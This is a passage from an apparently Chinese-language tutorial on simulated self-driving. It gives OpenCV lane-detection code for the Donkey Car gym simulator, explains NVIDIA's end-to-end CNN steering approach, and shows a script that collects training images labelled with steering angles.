class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 一条线都没检测到</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;检测不到行道线，退出程序&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        angle_to_mid_radian = math.atan(x_offset / y_offset)</span><br><span class="line">        angle_to_mid_deg = <span class="built_in">int</span>(angle_to_mid_radian * <span class="number">180.0</span> / math.pi)</span><br><span class="line">        steering_angle = angle_to_mid_deg / <span class="number">45.0</span></span><br><span class="line">        action = np.array([steering_angle, <span class="number">0.3</span>])  <span class="comment"># 油门值恒定</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 执行动作</span></span><br><span class="line">        obv, reward, done, info = env.step(action)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 重新获取图像</span></span><br><span class="line">        frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>别忘了要先启动模拟器噢！</p><p>到这里本节就已经接近尾声了。我对代码中的很多部分进行了修改，使它适应新版的opencv与实际情况。每一部分都重新编写了完整的测试代码。<strong>跳到这里没看的同学至少把测试代码运行一下，尝试理解原理。</strong></p><p>注意：如果当前生成的赛道有“十字路口交叉”（每次重新进入赛道其生成的赛道都是随机绘制的），那么在运行的时候可能会出现失败、跑出赛道的现象。因为这种十字路口我们在程序中没有考虑。如何规避这个问题，有兴趣的同学可以自行研究。</p><p>本文更多的关注基于深度学习的图像处理技术，对于传统的图像处理算法（例如霍夫变换等）本文不再深入分析，同学们如果对这些传统图像处理算法不熟悉的可以自行再查阅资料深入研究，上面已经给出了不少资料的链接。</p><p>截止到目前为止，我们借助上面这个基于opencv的自动驾驶模拟平台，我们重新巩固了Python、opencv图像处理的基本使用方法，了解了自动驾驶项目的难点，对整个处理流程有了更进一步的认识。需要说明的是，尽管我们上述操作步骤是针对我们这个自动驾驶模拟平台的，但是以上步骤同样适用于很多其他图像处理任务，很多传统的图像处理任务都涵盖颜色空间变换、特定颜色物体提取、感兴趣区域过滤、霍夫变换等步骤，因此掌握上述常规的图像处理技术是非常重要的。</p><h2 id="3-基于深度学习的自动驾驶控制"><a href="#3-基于深度学习的自动驾驶控制" class="headerlink" title="3.基于深度学习的自动驾驶控制"></a>3.基于深度学习的自动驾驶控制</h2><p>在上一节中我们通过OpenCV图像处理技术实现了一个简易的自动驾驶小车。但是很明显，这辆自动驾驶小车的适应性很差，当图像中有相同颜色的干扰物出现时，那么对于这辆自动驾驶的小车来说就是顶级灾难。另外，我们需要大量人工定义的参数，例如行道线颜色（黄色或白色）、颜色阈值、霍夫变换阈值等，而且一旦地图环境换了，所有这些参数我们都得重新手工调整，这些参数之间又有一定的耦合性，参数调整很麻烦。很显然，这种处理方法普适性不好。</p><p>那么能不能丢给机器一大堆图片，让机器自己去学习如何从当前图像中分析出小车应该转向的合适角度？如果没有接触过深度学习，那么乍一听这个想法简直是天方夜谭，然而深度学习确实做到了。这就是为什么近十年深度学习在图像处理领域取得了全面成功。深度学习能够从大量图像数据中自行学习高层次语义特征，完成媲美人类甚至超越人类的推理水平，整个学习过程不用人为干预，我们要做的就是“喂”一堆图片并且设定好需要优化的目标函数即可。当我们“喂”的图片越多、种类越丰富，那么最终机器学习到的驾驶水平越强，而且适应性越好。</p><p>本小节开始我们将正式进入基于深度学习的自动驾驶领域。</p><h3 id="3-0一些基础知识"><a href="#3-0一些基础知识" class="headerlink" title="3.0一些基础知识"></a>3.0一些基础知识</h3><p>根据后面要用到的网络，这里放上一些基础知识，篇幅都不(太)长，请同学们阅读。</p><p><a href="https://zhuanlan.zhihu.com/p/243050824">神经网络与深度学习</a> 这种基本的认识想必大家已经有了，但这里还是放一放。</p><p><a href="https://www.bilibili.com/video/BV1hE411t7RN?share_source=copy_web">pytorch基础教程</a> pytorch可以使用英伟达NVIDIA的产品进行GPU运算，但AMD锐龙的显卡并不支持。教程后期有教到如何使用。这是非常浅显易懂的课(用张老师的话来说就是傻瓜式的)，因此虽然我们主要用到的是pytorch但这里不进行教学。如果仍有困难，后面我会现场讲解或录视频，加上写文档的方式帮助同学们。</p><p><a href="https://blog.csdn.net/fanxin_i/article/details/80212906">bp神经网络原理</a> bp神经网络我在导论课上讲的那个就是，忘了的话可以去导论那个群下载对应的excel演示下来玩一下。对应的论文也是非常有趣，预训练现在的应用非常广泛，同学们可以阅读一下。</p><p><a href="https://zhuanlan.zhihu.com/p/47184529">卷积神经网络与池化、全连接、归一化</a></p><p><a href="https://zhuanlan.zhihu.com/p/112993440">全连接神经网络</a></p><p><a href="https://zhuanlan.zhihu.com/p/424518359">归一化</a></p><p><a href="https://www.zhihu.com/question/51435499">端到端是什么</a></p><p>同时建议大家复习一下我当时给大家讲python的时候说到的os库。</p><h3 id="3-1算法原理"><a href="#3-1算法原理" class="headerlink" title="3.1算法原理"></a>3.1算法原理</h3><p>本项目实现思路参考2016年英伟达发表的论文《End to End Learning for Self-Driving Cars》。这篇文章提出的方法核心思想就是使用神经网络自动提取图像特征，从传统的 image -&gt; features -&gt; action变成了image -&gt; action。该论文使用了深度网络结构，大大增强了图像特征提取能力，最终取得了不错的效果，其训练的模型不论是普通道路还是高速路，不论有道路标线还是没有道路标线都非常有效，解决了传统算法泛化性能差的问题。本文方法的测试性能非常好，在16年自动驾驶研究火热时，是一篇影响力很大的文章，即使放到现在，也是作为自动驾驶入门必读的Paper。</p><p>整个算法原理很简单，是对真实人类操作的一个模拟。对于我们人类驾驶员来说，假设我们正在驾驶这辆车，我们的执行流程跟上面算法也是一样的。首先我们用眼睛观看路面，然后我们的大脑根据当前眼睛看到的路面情况“下意识”的转动方向盘，转动一个我们认为合适的角度，从而避免车辆开出路面。这篇论文算法实现原理也是这样，具体如下图所示：</p><p><img src="/.io//essay1.png"></p><p>通过中间摄像头采集图像，然后图像输入到预先训练好的CNN网络，这个网络的输出是一个转向角度（可以理解为方向盘的转向角度），有了这个角度就可以控制小车按照这个角度进行转向。</p><p>有了这样一个模式，我们就只需要想办法训练这个CNN模型，针对每帧图像，都有一个我们认为合适的转向角度输出，即输入图像，输出一个回归值。具体模型结构如下图所示：<br><img src="/.io//essay2.png"></p><p>整个模型结构并不复杂，就是一堆的普通的CNN卷积神经网络模块按照顺序堆叠，最后使用全连接网络输出回归值。这个模型一共包含30层，由于其输入精度比较低(66x200)，因此推理速度也是比较快的，借助GPU可以实现实时推理。具体的，图像首先经过Normalization标准化，然后经过5组卷积层处理，最后拉平以后通过4个全连接层输出一个回归值，这个回归值就是我们项目中的转向角。</p><p>这里我们会遇到一个问题，训练上述深度神经网络我们需要大量的数据，即每帧图像以及对应的最佳转向值，这些数据怎么来呢？这篇论文里提出了一个方法，既然是模拟人类行为，那么只要让驾驶水平高超的“老司机”在相关赛道上进行手动驾驶，驾驶时一边记录每帧图像同时记录当前帧对应的操控的转向角，这样一组组数据记录下来就是我们认为的“最佳”训练数据。训练时，将模型预测的角度与给定图像帧的期望转向角度进行比较，误差通过反向传播反馈到CNN训练过程中，如下图所示。从图可以看出，这个过程在一个循环中重复，直到误差（本例中使用均方误差）足够低，这意味着模型已经学会了如何合理地转向。事实上，这是一个非常典型的图像分类训练过程，只不过这里预测输出是数值（回归值）而不是对象类别（分类概率）。<br> 可以想象，如果能够完全的训练好这个模型，那么最终模型的输出结果是非常接近人类驾驶经验的。这篇论文通过大量实验证明，上述模型能够直接从拍摄的路面图像中有效的学习到最终的转向角，省去了传统算法颜色区域检测、感兴趣区域选择、霍夫变换等一系列复杂的耦合步骤。这篇论文做了一组实验，通过收集不到一百小时的少量训练数据进行训练，最后得到的模型足以支持在各种条件下操控车辆，比如高速公路、普通公路和居民区道路，以及晴天、多云和雨天等天气状况。</p><p>需要说明的是，这个模型的输出仅有一个转向角度，这样容易学习成功。如果输出变量再多一些（例如油门值、摄像头角度、行人避障等），那么这个模型还需要再进一步优化，感兴趣的同学可以借鉴近两年的论文进行深入研究（而我们的项目就是要做这个）。<br>接下来我们就按照这个算法流程进行实现。</p><p>###3.2数据采集</p><p>针对我们采用的自动驾驶模拟平台，为了能够采集到每帧图像及对应的最佳转向角度，我们可以使用前面第2节方法编写控制代码通过键盘控制小车（低匀速运行，仅仅只需要控制转向角度），然后记录每帧数据即可。这种模式是真实自动驾驶使用的，但是需要我们自己把自己练成经验充足的“老司机”，然后再去教会算法怎么驾驶。这样比较麻烦，这里可以有一种“偷懒”的办法。我们使用前面调参调的不错的OpenCV自动驾驶版本，使用OpenCV算法自动驾驶，然后记录每帧图像及对应角度。尽管这个OpenCV自动驾驶水平本身也一般（没有一直控制在两条行道线的绝对正中间），但是胜在能够基本稳定在行道线内。本文只是一个自动驾驶入门项目，可以采用这样的方法收集数据，来快速验证深度学习自动驾驶可行性。真实项目的话还是需要向“老司机”学习的。</p><p>先定义自定义tools库，这里对上面的进行了一定的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">region_of_interest</span>(<span class="params">edges, color=<span class="string">&#x27;yellow&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    感兴趣区域提取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width = edges.shape</span><br><span class="line">    mask = np.zeros_like(edges)</span><br><span class="line">    <span class="comment"># 定义感兴趣区域掩码轮廓</span></span><br><span class="line">    <span class="keyword">if</span> color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line">        polygon = np.array([[(<span class="number">0</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height),</span><br><span class="line">                             (<span class="number">0</span>, height)]], np.int32)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        polygon = np.array([[(width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width, height),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height)]], np.int32)</span><br><span class="line">    <span class="comment"># 填充感兴趣区域掩码</span></span><br><span class="line">    cv2.fillPoly(mask, polygon, <span class="number">255</span>)</span><br><span class="line">    <span class="comment"># 提取感兴趣区域</span></span><br><span class="line">    croped_edge = cv2.bitwise_and(edges, mask)</span><br><span class="line">    <span class="keyword">return</span> croped_edge</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment">#角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment">#最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,</span><br><span class="line">                            rho,</span><br><span class="line">                            angle,</span><br><span class="line">                            min_thr,</span><br><span class="line">                            np.array([]),</span><br><span class="line">                            minLineLength=<span class="number">8</span>,</span><br><span class="line">                            maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    fits = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整采集代码如下，同样有一定的变化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> region_of_interest, detect_line, make_points, average_lines, display_line</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置模拟器环境</span></span><br><span class="line">    env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始启动</span></span><br><span class="line">    action = np.array([<span class="number">0</span>, <span class="number">0.3</span>])  <span class="comment"># 动作控制，第1个转向值，第2个油门值</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 执行动作</span></span><br><span class="line">    obv, reward, done, info = env.step(action)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取图像</span></span><br><span class="line">    frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行4000次动作</span></span><br><span class="line">    pic_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):</span><br><span class="line">        <span class="comment"># 转换图像到HSV空间</span></span><br><span class="line">        height, width, _ = frame.shape</span><br><span class="line">        hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">15</span>, <span class="number">40</span>, <span class="number">40</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">45</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">        yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">180</span>, <span class="number">30</span>, <span class="number">255</span>])</span><br><span class="line">        white_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色线边缘提取</span></span><br><span class="line">        yellow_edge = cv2.Canny(yellow_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色线边缘提取</span></span><br><span class="line">        white_edge = cv2.Canny(white_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色线感兴趣区域提取</span></span><br><span class="line">        yellow_roi = region_of_interest(yellow_edge, color=<span class="string">&#x27;yellow&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色线感兴趣区域提取</span></span><br><span class="line">        white_roi = region_of_interest(white_edge, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色线段检测</span></span><br><span class="line">        yellow_lines = detect_line(yellow_roi)</span><br><span class="line">        yellow_lane = average_lines(frame, yellow_lines, direction=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="comment">#yellow_show = display_line(frame, yellow_lane)</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色线段检测</span></span><br><span class="line">        white_lines = detect_line(white_roi)</span><br><span class="line">        white_lane = average_lines(frame, white_lines, direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">        <span class="comment">#white_show = display_line(frame, white_lane, line_color=(255, 0, 0))</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 计算转向角</span></span><br><span class="line">        x_offset = <span class="number">0</span></span><br><span class="line">        y_offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span>:  <span class="comment"># 检测到2条线</span></span><br><span class="line">            _, _, left_x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            _, _, right_x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            mid = <span class="built_in">int</span>(width / <span class="number">2</span>)</span><br><span class="line">            x_offset = (left_x2 + right_x2) / <span class="number">2</span> - mid</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(yellow_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到黄色行道线</span></span><br><span class="line">            x1, _, x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到白色行道线</span></span><br><span class="line">            x1, _, x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 一条线都没检测到</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;检测不到行道线，退出程序&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        angle_to_mid_radian = math.atan(x_offset / y_offset)</span><br><span class="line">        angle_to_mid_deg = <span class="built_in">int</span>(angle_to_mid_radian * <span class="number">180.0</span> / math.pi)</span><br><span class="line">        steering_angle = angle_to_mid_deg / <span class="number">45.0</span></span><br><span class="line">        action = np.array([steering_angle, <span class="number">0.1</span>])  <span class="comment"># 油门值恒定</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 记录当前图像和转向角度</span></span><br><span class="line">        img_path = <span class="string">&quot;log/&#123;:d&#125;_&#123;:.4f&#125;.jpg&quot;</span>.<span class="built_in">format</span>(pic_index, steering_angle)</span><br><span class="line">        cv2.imwrite(img_path, frame)</span><br><span class="line">        pic_index += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 执行动作</span></span><br><span class="line">        obv, reward, done, info = env.step(action)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 重新获取图像</span></span><br><span class="line">        frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;结束本次采集&#x27;</span>)</span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>图片名采用“图片帧号_转向角度.jpg”的形式命名。上述代码每次跑完会在log目录下生成4000多张图片。由于每次的地图都是随机生成的，因此我们可以多跑几次，多收集一些数据。</p><p><img src="/.io//Snipaste_2022-04-30_13-50-48.png"></p><p>最终共采集10个文件夹图片，总共4万张图片：</p><p><img src="/.io//Snipaste_2022-04-30_17-05-30.png"></p><p>接下来我们需要对这些图片进行整理，拆分数据集用于训练和验证。我们把这些文件夹移动到data&#x2F;simulate下，注意这个文件夹<strong>需要自己手动创建</strong>。</p><p>详细脚本代码create_data_lists.py如下：</p><figure 